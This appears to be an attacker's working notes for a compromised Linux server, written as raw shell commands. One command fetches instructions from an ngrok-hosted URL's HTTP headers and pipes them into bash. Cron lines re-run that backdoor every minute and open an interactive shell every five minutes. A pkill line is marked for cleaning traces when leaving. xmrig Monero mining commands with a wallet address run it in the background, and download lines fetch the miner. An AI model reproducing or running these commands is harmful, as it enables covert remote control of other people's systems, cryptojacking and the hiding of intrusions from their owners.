curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:' | cut -d':' -f2- | xargs | bash

#kill
kill -9 $(lsof -t -i :443)
pkill -u mangalamuhurtha -f "acpid.socket|sh -i|cat /tmp/f|/bin/sh -c curl|script -q -c" # use when leave to clean trace
#cron job

# Looks cryptic at a glance
*/1 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:' | cut -d':' -f2- | xargs | bash
*/5 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^lee:' | cut -d':' -f2- | xargs | script -q -c "/bin/bash" /dev/null


#rig
xmrig --url eu.hashvault.pro:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass zao --donate-level 0 --tls --coin monero -B --randomx-mode=fast --cpu-priority=3 --cpu-max-threads-hint 50 --yield | -t 1 # this might be better than --cpu-max-threads-hint 50

xmrig --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass tzao --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=3 -t 1 --yield 

curl -L -o xmrig-6.25.0.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-jammy-x64.tar.gz

curl -L -o xmrig.tar.gz https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz
